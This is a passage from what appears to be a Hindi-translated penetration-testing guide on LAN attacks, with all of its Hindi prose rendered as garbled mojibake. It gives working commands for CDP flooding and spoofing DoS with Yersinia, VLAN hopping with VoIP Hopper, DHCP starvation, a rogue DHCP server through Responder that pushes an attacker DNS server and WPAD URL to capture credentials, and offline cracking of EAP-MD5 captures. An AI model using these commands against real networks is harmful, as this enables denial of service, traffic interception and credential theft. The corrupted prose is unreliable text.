#### CDP рддрд╛рд▓рд┐рдХрд╛ рднрд░рд╛рдИ рдХреЛ рдЙрддреНрдкреНрд░реЗрд░рд┐рдд рдХрд░рдирд╛ <a href="#id-0d6a" id="id-0d6a"></a>

рдПрдХ рдЕрдзрд┐рдХ рдкреНрд░рд╡реГрддреНрдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ рдбреЗрдирд╛рдпрд▓ рдСрдл рд╕рд░реНрд╡рд┐рд╕ (DoS) рд╣рдорд▓рд╛ рдЪрд╛рд▓реВ рдХрд░рдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХреА рд╕реНрдореГрддрд┐ рдХреЛ рднрд░ рджреЗрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛, рд╡рд╛рд╕реНрддрд╡рд┐рдХ CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХреА рднрд╛рдБрддрд┐ рдмрдирдиреЗ рдХрд╛ рджрд┐рдЦрд╛рд╡рд╛ рдХрд░рддреЗ рд╣реБрдПред рдиреАрдЪреЗ рдПрдХ рдХрдорд╛рдВрдб рдХреНрд░рдо рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Yersinia рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдРрд╕рд╛ рд╣рдорд▓рд╛ рдЖрд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```

рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рджреМрд░рд╛рди, рд╕реНрд╡рд┐рдЪ рдХреА рд╕реАрдкреАрдпреВ рдФрд░ рд╕реАрдбреАрдкреА рдкрдбрд╝реЛрд╕реА рд╕рд╛рд░рдгреА рднрд╛рд░реА рд╣реЛ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрд╕рд╛рдзрди рдЙрдкрднреЛрдЧ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдЕрдХреНрд╕рд░ **тАЬрдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рд▓рдВрдмтАЭ** рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### CDP рдЕрдиреБрд░реВрдкрдг рд╣рдорд▓рд╛

```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```

рдЖрдк [**scapy**](https://github.com/secdev/scapy/) рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `scapy/contrib` рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦреЗрдВред

### VoIP рд╣рдорд▓реЗ рдФрд░ VoIP Hopper рдЯреВрд▓

VoIP рдлреЛрди, рдЬреЛ рдЖрдИрдУрдЯреА рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдмрдврд╝рддреЗ рд╣реБрдП рдПрдХреАрдХреГрдд рд╣реЛ рд░рд╣реЗ рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рдлреЛрди рдирдВрдмрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓рдиреЗ рдпрд╛ рдерд░реНрдореЛрд╕реНрдЯреИрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реА рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдПрдХреАрдХрд░рдг рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЙрдкрдХрд░рдг [**voiphopper**](http://voiphopper.sourceforge.net) рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╡рд╛рддрд╛рдиреБрдХреВрд▓рди (рд╕рд┐рд╕реНрдХреЛ, рдЕрд╡рд╛рдпрд╛, рдиреЙрд░реНрдЯреЗрд▓, рдЕрд▓рдХрд╛рдЯреЗрд▓-рд▓реБрд╕реЗрдВрдЯ) рдореЗрдВ рдПрдХ VoIP рдлреЛрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ CDP, DHCP, LLDP-MED, рдФрд░ 802.1Q ARP рдЬреИрд╕реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╡рд╛рдЬ рдиреЗрдЯрд╡рд░реНрдХ рдХреА VLAN ID рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

**VoIP Hopper** рд╕рд┐рд╕реНрдХреЛ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (CDP) рдХреЗ рд▓рд┐рдП рддреАрди рдореЛрдб рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

1. **рд╕реНрдирд┐рдл рдореЛрдб** (`-c 0`): рд╡реАрд▓рд╛рди рдЖрдИрдбреА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреЛрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИред
2. **рд╕реНрдкреВрдл рдореЛрдб** (`-c 1`): рд╡рд╛рд╕реНрддрд╡рд┐рдХ VoIP рдЙрдкрдХрд░рдг рдХреЗ рдЙрд╕рдХреЗ рд╕рдорд╛рди рдХрд╕реНрдЯрдо рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред
3. **рдкреВрд░реНрд╡-рддреИрдпрд╛рд░ рдкреИрдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реНрдкреВрдл рдореЛрдб** (`-c 2`): рдХрд┐рд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд┐рд╕реНрдХреЛ рдЖрдИрдкреА рдлреЛрди рдореЙрдбрд▓ рдХреЗ рдЙрд╕рдХреЗ рд╕рдорд╛рди рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред

рддреАрд╕рд░реЗ рдореЛрдб рдХреЗ рд▓рд┐рдП рдкрд╕рдВрджреАрджрд╛ рдореЛрдб рддреАрд╕рд░рд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

* рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ (`-i` рдкреИрд░рд╛рдореАрдЯрд░)ред
* рдЕрдиреБрдХреГрдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ VoIP рдЙрдкрдХрд░рдг рдХрд╛ рдирд╛рдо (`-E` рдкреИрд░рд╛рдореАрдЯрд░), рд╕рд┐рд╕реНрдХреЛ рдирд╛рдордХрд░рдг рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП (рдЬреИрд╕реЗ, MAC рдкрддреЗ рдХреЗ рдмрд╛рдж SEP)ред

рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ, рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ VoIP рдЙрдкрдХрд░рдг рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдлреЛрди рдкрд░ MAC рд▓реЗрдмрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
* рдореЙрдбрд▓ рд╕реВрдЪрдирд╛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдлреЛрди рдХреЗ рдкреНрд░рджрд░реНрд╢рди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред
* рд╡рд╛рдпрд░рд╢рд╛рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CDP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП VoIP рдЙрдкрдХрд░рдг рдХреЛ рдПрдХ рд▓реИрдкрдЯреЙрдк рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВред

рддреАрд╕рд░реЗ рдореЛрдб рдореЗрдВ рдЙрдкрдХрд░рдг рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```

### DHCP рд╣рдорд▓реЗ

#### рдЧрдгрдирд╛

```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```

**DoS**

DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдЦрд┐рд▓рд╛рдл **рджреЛ рдкреНрд░рдХрд╛рд░ рдХреА DoS** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдкрд╣рд▓реА рдореЗрдВ **рдХрд╛рдлреА рдирдХрд▓реА рд╣реЛрд╕реНрдЯ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛** рд╢рд╛рдорд┐рд▓ рд╣реИред\
рдпрд╣ рд╣рдорд▓рд╛ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ рдЖрдк DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (**Discover** (рдХрдВрдк) --> **Offer** (рд╕рд░реНрд╡рд░) --> **Request** (рдХрдВрдк) --> **ACK** (рд╕рд░реНрд╡рд░))ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рдирд╣реАрдВ рд╣реИ**ред

DHCP DoS рдХреЛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╣рд░ рд╕рдВрднрд╛рд╡рд┐рдд IP рдХрд╛ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **DHCP-RELEASE рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ**ред рдлрд┐рд░, рд╕рд░реНрд╡рд░ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ рд╕рднреА рдиреЗ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рд╣реИред

```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```

рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХрд╛ рдЙрдкрдХрд░рдг [DHCPing](https://github.com/kamorin/DHCPig) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

рдЖрдк рдорд╛рдиреНрдп рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрд╕рдХреНрд░рд┐рдп рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рд┐рдЦрд┐рдд DoS рд╣рдорд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЕрд╕рдХреНрд░рд┐рдп рд╣реЛ рдЬрд╛рдПрдВред рдЗрд╕рд╕реЗ рдЬрдм рдорд╛рдиреНрдп рд╕рд░реНрд╡рд░ рдлрд┐рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, **рдЖрдк рдЕрдЧрд▓реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рджреБрд╖реНрдХрд░реНрдореА рдорд╛рдиреНрдпреЛрдВ рдХреЛ рд╕рд░реНрд╡ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

#### рджреБрд╖реНрдХрд░реНрдореА рдорд╛рдиреНрдпреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВ

рдПрдХ рджреБрд╖реНрдХрд░реНрдореА DHCP рд╕рд░реНрд╡рд░ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/usr/share/responder/DHCP.py` рдкрд░ рд╕реНрдерд┐рдд DHCP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИ, рдЬреИрд╕реЗ HTTP рдЯреНрд░реИрдлрд┐рдХ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛, рджреБрд╖реНрдХрд░реНрдореА рд╕рд░реНрд╡рд░ рдкрд░ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рджреБрд╖реНрдХрд░реНрдореА рдЧреЗрдЯрд╡реЗ рд╕реЗрдЯ рдХрд░рдирд╛ рдХрдо рдкреНрд░рднрд╛рд╡реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЧреЗрдЯрд╡реЗ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдЫреВрдЯ рдЬрд╛рддреА рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдПрдХ рджреБрд╖реНрдХрд░реНрдореА DNS рдпрд╛ WPAD рд╕рд░реНрд╡рд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдПрдХ рдЕрдзрд┐рдХ рдкреНрд░рднрд╛рд╡реА рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

рдиреАрдЪреЗ рджреБрд╖реНрдХрд░реНрдореА DHCP рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* **рд╣рдорд╛рд░рд╛ рдЖрдИрдкреА рдкрддрд╛ (рдЧреЗрдЯрд╡реЗ рд╡рд┐рдЬреНрдЮрд╛рдкрди)**: рдЕрдкрдиреА рдорд╢реАрди рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-i 10.0.0.100` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо**: рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-d example.org` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдореВрд▓ рд░рд╛рдЙрдЯрд░/рдЧреЗрдЯрд╡реЗ рдЖрдИрдкреА**: рдорд╛рдиреНрдп рд░рд╛рдЙрдЯрд░ рдпрд╛ рдЧреЗрдЯрд╡реЗ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-r 10.0.0.1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдкреНрд░рд╛рдердорд┐рдХ DNS рд╕рд░реНрд╡рд░ рдЖрдИрдкреА**: рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рджреБрд╖реНрдХрд░реНрдореА DNS рд╕рд░реНрд╡рд░ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-p 10.0.0.100` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ рдЖрдИрдкреА**: рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ рдЖрдИрдкреА рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-s 10.0.0.1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдиреЗрдЯрдорд╛рд╕реНрдХ**: рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрдорд╛рд╕реНрдХ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-n 255.255.255.0` рдХрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░реЗрдВред
* **DHCP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рдлреЗрд╕**: рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ DHCP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП `-I eth1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрддрд╛**: рд╡реЗрдм рдЯреНрд░реИрдлрд┐рдХ рдЕрдВрддрд░рджрд╛рдЦрд┐рд▓ рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-w тАЬhttp://10.0.0.100/wpad.datтАЭ` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдЖрдИрдкреА рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдЖрдИрдкреА рдкрддрд╛ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП `-S` рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВред
* **рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдирд╛**: рд╕рд░реНрд╡рд░ рдХреЛ рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП `-R` рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд╢реЛрд░рдЧреБрд▓ рдФрд░ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рд╕рд╣реА рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рджреБрд╖реНрдХрд░реНрдореА DHCP рд╕рд░реНрд╡рд░ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЕрднрд┐рдЧреНрд░рд╣рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```

### **EAP рд╣рдорд▓реЗ**

рдпрд╣рд╛рдБ рдХреБрдЫ рд╣рдорд▓реЗ рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВ рдЬреЛ 802.1X рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* EAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдЧреНрд░рд╛рдЗрдВрдбрд┐рдВрдЧ
* рд╡рд┐рдХреГрдд EAP рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде RADIUS рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ _\*\*_(рд╢реЛрд╖рдг)
* EAP рд╕рдВрджреЗрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рдФрд░ рдСрдлрд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ (EAP-MD5 рдФрд░ PEAP)
* EAP-MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ TLS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдпрддрд╛ рдХреА рдЕрдирджреЗрдЦреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд▓рдкреВрд░реНрд╡рдХ рдХрд░рдирд╛
* рд╣рдм рдпрд╛ рд╕рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рддреЗ рд╕рдордп рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдбрд╛рд▓рдирд╛

рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╣реИ, рддреЛ рд╡рд╣ (рдЬрд░реВрд░рдд рдкрдбрд╝рдиреЗ рдкрд░) рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ EAP-MD5 рдореЗрдВ рдЧрд┐рд░рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░, рдЙрд╕реЗ рдЗрд╕рдХрд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

```
eapmd5pass тАУr pcap.dump тАУw /usr/share/wordlist/sqlmap.txt
```

### FHRP (GLBP & HSRP) рд╣рдорд▓реЗ <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрдХреНрд╖рд╛ рд╣реИ рдЬреЛ **рдПрдХ рд╣реЙрдЯ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдорд╛рд░реНрдЧ рдкреНрд░рдгрд╛рд▓реА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╣реИрдВред FHRP рдХреЗ рд╕рд╛рде, рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░ рдХреЛ рдПрдХ рд╣реА рддрд╛рд░реНрдХрд┐рдХ рдЙрдкрдХрд░рдг рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рджреЛрд╖ рд╕рд╣рдирд╢реАрд▓рддрд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИ рдФрд░ рднрд╛рд░ рдХрд╛ рд╡рд┐рддрд░рдг рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИред

